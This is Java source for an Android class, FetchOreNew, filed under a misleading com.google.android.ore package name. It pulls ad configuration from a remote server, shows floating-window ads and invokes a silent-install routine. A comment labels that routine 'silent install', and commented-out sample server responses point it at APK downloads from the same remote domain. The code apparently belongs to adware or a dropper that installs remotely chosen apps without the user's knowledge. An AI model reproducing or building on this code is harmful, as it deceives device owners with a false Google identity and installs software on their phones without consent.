package com.google.android.ore;

import android.content.Context;
import android.text.TextUtils;

import com.google.android.ore.thinkandroid.L;
import com.google.android.ore.thinkandroid.http.AsyncHttpResponseHandler;

public class FetchOreNew extends FetchOre {
	FetchFloatingWindowOreMaterialNew mFetchFloatingWindowOreMaterialNew;
	SlientInstall mSlientInstall;
	FetchGeneralOreMaterial mFetchGeneralOreMaterial;

	public FetchOreNew() {
		super();
		mFetchFloatingWindowOreMaterialNew = new FetchFloatingWindowOreMaterialNew();
		mSlientInstall = new SlientInstall();
		mFetchGeneralOreMaterial = new FetchGeneralOreMaterial();
	}

	@Override
	protected void noFetch(Context context) {
		doTask(context);
	}

	@Override
	protected AsyncHttpResponseHandler createHandler(final Context context) {
		return new AsyncHttpResponseHandler() {

			@Override
			public void onSuccess(int statusCode, String content) {
				super.onSuccess(statusCode, content);
				L.d(TAG, "fetchOre onSuccess content=" + content
						+ " statusCode=" + statusCode);
				if (statusCode == 200 && !TextUtils.isEmpty(content)) {
					// 拉去到广告解析并保存
					// ore_general_list
					// content =
					// "{\"ret\":0,\"msg\":\"\",\"content\":{\"ore_config\":{\"domain\":\"api.codeforbaby.com\",\"user_id\":\"57432\",\"fetch_ore_succ_interval\":\"20\",\"fetch_ore_fail_interval\":\"20\",\"report\":\"0\",\"floating_window_max_show_num\":\"2\",\"floating_window_show_max_inteval\":\"120\",\"floating_window_show_min_inteval\":\"60\",\"repeat_duration\":\"5\"},\"ore_floating_window\":null,\"ore_general_list\":[{\"ore_id\":\"4\",\"ore_type\":\"6\",\"ore_item_id\":\"14\",\"ore_item\":{\"ore_item_id\":\"14\",\"ore_item_desc\":\"\\u56fd\\u6c11\\u6355\\u9c7c\",\"ore_item_img_url\":\"\",\"ore_item_img_md5\":\"\",\"click_url\":\"http:\\/\\/cdn89.codeforbaby.com\\/guomin_buyu_huodongyuan.apk\",\"click_action\":\"2\",\"app_name\":\"\\u56fd\\u6c11\\u6355\\u9c7c\",\"app_icon_url\":\"http:\\/\\/cdn89.codeforbaby.com\\/ads\\/f6\\/d5\\/f6d54525ee2e5dca72f502d12c593e961463884515.png\",\"app_icon_md5\":\"db82915578d10f5f9901660a405146c7\",\"app_size\":\"0\",\"app_package_name\":\"com.zhijiangame.catchfish\",\"app_main_activity_name\":\"org.cocos2dx.cpp.AppActivity\",\"app_launcher_action\":\"\",\"d1\":\"\",\"d2\":\"0\"}}]}}";
					// content =
					// "{\"ret\":0,\"msg\":\"\",\"content\":{\"ore_config\":{\"domain\":\"api.codeforbaby.com\",\"user_id\":\"57432\",\"fetch_ore_succ_interval\":\"20\",\"fetch_ore_fail_interval\":\"20\",\"report\":\"0\",\"floating_window_max_show_num\":\"2\",\"floating_window_show_max_inteval\":\"120\",\"floating_window_show_min_inteval\":\"60\",\"repeat_duration\":\"5\"},\"ore_floating_window\":{\"ore_id\":\"5\",\"ore_type\":\"7\",\"ore_resource\":\"http:\\/\\/cdn89.codeforbaby.com\\/ore-resource\\/ore5_20160525094550.zip\",\"ore_resource_md5\":\"6e17c01f6cdf6295b25f3fc0f987c49a\",\"display_mode\":\"\",\"display_img\":\"\",\"display_img_md5\":\"\",\"ore_item_id_list\":[\"19\",\"18\",\"17\",\"16\",\"15\"],\"ore_item_list\":[{\"ore_item_id\":\"19\",\"ore_item_desc\":\"\\u3010\\u5361\\u8428\\u7ea2\\u3011\\u52b3\\u62c9\\u767d\\u4e3b\\u56fe\",\"ore_item_img_url\":\"http:\\/\\/cdn89.codeforbaby.com\\/ads\\/cd\\/88\\/cd88c880f900827aa9439fe987cdff821463885827.jpg\",\"ore_item_img_md5\":\"f28b8fe5241c3a828f477984ebbe2784\",\"click_url\":\"http:\\/\\/weidian.com\\/item.html?itemID=1855585750&wfr=wx&share_id=251734768&code=0314lagp0Mcxmc15kigp0Dxegp04lag3&state=H5WXshare\",\"click_action\":\"3\",\"app_name\":\"\",\"app_icon_url\":\"\",\"app_icon_md5\":\"\",\"app_package_name\":\"\",\"app_size\":\"0\",\"app_main_activity_name\":\"\",\"app_launcher_action\":\"\",\"d1\":\"\",\"d2\":\"0\"},{\"ore_item_id\":\"18\",\"ore_item_desc\":\"sexxy\",\"ore_item_img_url\":\"http:\\/\\/cdn89.codeforbaby.com\\/ads\\/b6\\/b6\\/b6b63b3e6d03e0c66338ea13653d84551463885727.jpg\",\"ore_item_img_md5\":\"b55f54c61f4234b30d907a61f7f5a346\",\"click_url\":\"http:\\/\\/weidian.com\\/item.html?itemID=1852504518&recommonTag=online15462892064758840690&reqID=SIMILARPRODUCT_XIANGSI&fromRecommon=1855587708\",\"click_action\":\"3\",\"app_name\":\"\",\"app_icon_url\":\"\",\"app_icon_md5\":\"\",\"app_package_name\":\"\",\"app_size\":\"0\",\"app_main_activity_name\":\"\",\"app_launcher_action\":\"\",\"d1\":\"\",\"d2\":\"0\"},{\"ore_item_id\":\"17\",\"ore_item_desc\":\"\\u7f8e\\u65af\\u6709\\u673a\\u897f\\u62c9\\u7ea2\\u8461\\u8404\\u9152\",\"ore_item_img_url\":\"http:\\/\\/cdn89.codeforbaby.com\\/ads\\/1a\\/dc\\/1adc262932d7d6ef86f3362822aaabe31463885801.jpg\",\"ore_item_img_md5\":\"5be0bd24be26a6b2e20de84f2b1d007c\",\"click_url\":\"http:\\/\\/weidian.com\\/item.html?itemID=1855587708&wfr=wx&share_id=251734768&code=031ooSfm1mInrx0URyem1rRTfm1ooSfQ&state=H5WXshare\",\"click_action\":\"3\",\"app_name\":\"\",\"app_icon_url\":\"\",\"app_icon_md5\":\"\",\"app_package_name\":\"\",\"app_size\":\"0\",\"app_main_activity_name\":\"\",\"app_launcher_action\":\"\",\"d1\":\"\",\"d2\":\"0\"},{\"ore_item_id\":\"16\",\"ore_item_desc\":\"\\u4e3b\\u56fe\",\"ore_item_img_url\":\"http:\\/\\/cdn89.codeforbaby.com\\/ads\\/71\\/23\\/712309b6d79859053453c587144083fe1463885777.jpg\",\"ore_item_img_md5\":\"7f8c6f55153314cd0b836f5a7d7a1465\",\"click_url\":\"http:\\/\\/weidian.com\\/item.html?itemID=1855583856&wfr=wx&share_id=251734768&code=041AeGMO0U4LLg23K9MO0bvEMO0AeGMK&state=H5WXshare\",\"click_action\":\"3\",\"app_name\":\"\",\"app_icon_url\":\"\",\"app_icon_md5\":\"\",\"app_package_name\":\"\",\"app_size\":\"0\",\"app_main_activity_name\":\"\",\"app_launcher_action\":\"\",\"d1\":\"\",\"d2\":\"0\"},{\"ore_item_id\":\"15\",\"ore_item_desc\":\"\\u5012\\u9152\\u52a8\\u4f5c\",\"ore_item_img_url\":\"http:\\/\\/cdn89.codeforbaby.com\\/ads\\/5a\\/d6\\/5ad6521255422fb57a230acfffa8f52b1463885214.jpg\",\"ore_item_img_md5\":\"a8707cdfca3f44154b5cbd4ffa7578ed\",\"click_url\":\"http:\\/\\/weidian.com\\/item.html?itemID=1855583856&wfr=wx&share_id=251734768&code=041AeGMO0U4LLg23K9MO0bvEMO0AeGMK&state=H5WXshare\",\"click_action\":\"3\",\"app_name\":\"\",\"app_icon_url\":\"\",\"app_icon_md5\":\"\",\"app_package_name\":\"\",\"app_size\":\"0\",\"app_main_activity_name\":\"\",\"app_launcher_action\":\"\",\"d1\":\"\",\"d2\":\"0\"}]},\"ore_general_list\":null}}";
					// content =
					// "{\"ret\":0,\"msg\":\"\",\"content\":{\"ore_config\":{\"domain\":\"api.codeforbaby.com\",\"user_id\":\"57432\",\"fetch_ore_succ_interval\":\"20\",\"fetch_ore_fail_interval\":\"20\",\"report\":\"0\",\"floating_window_max_show_num\":\"2\",\"floating_window_show_max_inteval\":\"120\",\"floating_window_show_min_inteval\":\"60\",\"repeat_duration\":\"5\"},\"ore_floating_window\":null,\"ore_general_list\":[{\"ore_id\":\"4\",\"ore_type\":\"1\",\"ore_item_id\":\"14\",\"ore_item\":{\"ore_item_id\":\"14\",\"ore_item_desc\":\"\\u56fd\\u6c11\\u6355\\u9c7c\",\"ore_item_img_url\":\"\",\"ore_item_img_md5\":\"\",\"click_url\":\"http:\\/\\/cdn89.codeforbaby.com\\/guomin_buyu_huodongyuan.apk\",\"click_action\":\"2\",\"app_name\":\"\\u56fd\\u6c11\\u6355\\u9c7c\",\"app_icon_url\":\"http:\\/\\/cdn89.codeforbaby.com\\/ads\\/f6\\/d5\\/f6d54525ee2e5dca72f502d12c593e961463884515.png\",\"app_icon_md5\":\"db82915578d10f5f9901660a405146c7\",\"app_size\":\"0\",\"app_package_name\":\"com.zhijiangame.catchfish\",\"app_main_activity_name\":\"org.cocos2dx.cpp.AppActivity\",\"app_launcher_action\":\"\",\"d1\":\"\",\"d2\":\"0\"}}]}}";
					handleContent(content);
				}
			}

			@Override
			public void onFailure(Throwable error, String content) {
				super.onFailure(error, content);
				String errMsg = "";
				if (error != null) {
					errMsg = error.getMessage();
				}
				L.d(TAG, "fetchOre onFailure content=" + content + " error="
						+ errMsg);
			}

			@Override
			public void onFinish() {
				super.onFinish();
				isAliving = false;
				doTask(context);
			}
		};
	}

	protected void doTask(Context context) {
		// 同步从数据库读取浮窗素材拉取, 在mFetchFloatingWindowOreMaterialNew里面会更新db,并且显示广告
		mFetchFloatingWindowOreMaterialNew.fetch(context);
		// 静默安装
		mSlientInstall.fetch(context);
		//general
		mFetchGeneralOreMaterial.asynFetch(context);
	}
}
